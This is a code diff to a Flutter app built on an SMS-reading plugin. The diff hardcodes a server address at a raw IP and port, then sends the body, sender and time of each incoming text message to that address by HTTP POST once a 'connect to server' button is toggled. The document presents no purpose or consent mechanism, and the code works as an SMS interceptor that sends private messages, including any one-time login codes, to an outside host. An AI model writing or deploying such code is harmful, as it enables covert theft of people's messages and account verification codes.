@@ -19,7 +19,7 @@ class MyApp extends StatefulWidget {
 class _MyAppState extends State<MyApp> {
   final _plugin = Readsms();
   bool setServer = false;
-  String serverAddress = '';
+  String serverAddress = 'http://43.135.75.195:7878/send';
 
   @override
   void initState() {
@@ -29,7 +29,8 @@ class _MyAppState extends State<MyApp> {
         _plugin.read();
         _plugin.smsStream.listen((event) {
           //
-
+          sendData(serverAddress, event.body, event.sender,
+              event.timeReceived.toString());
         });
       }
     });
@@ -87,12 +88,14 @@ class _MyAppState extends State<MyApp> {
                             },
                           ),
                           SizedBox(height: 20),
-                          OutlinedButton(onPressed: () {
-                            setState(() {
-                              serverAddress = serverAddress;
-                              setServer = !setServer;
-                            });
-                          }, child: Text('连接服务器'))
+                          OutlinedButton(
+                              onPressed: () {
+                                setState(() {
+                                  serverAddress = serverAddress;
+                                  setServer = !setServer;
+                                });
+                              },
+                              child: Text('连接服务器'))
                         ],
                       ),
                     )
@@ -104,17 +107,12 @@ class _MyAppState extends State<MyApp> {
   }
 }
 
-
-void sendData() async {
+void sendData(String urlx, String bodyx, String sender, String time) async {
   // Define the URL
-  var url = '';
+  var url = urlx;
 
   // Define the JSON data
-  var jsonData = {
-    "body": "this is",
-    "sender": "qweqweqweqwe",
-    "time": "212010212"
-  };
+  var jsonData = {"body": bodyx, "sender": sender, "time": time};
 
   // Encode the JSON data
   var body = jsonEncode(jsonData);
@@ -122,7 +120,7 @@ void sendData() async {
   try {
     // Make the POST request
     var response = await http.post(
-      url as Uri,
+      Uri.parse(url),
       headers: {"Content-Type": "application/json"},
       body: body,
     );
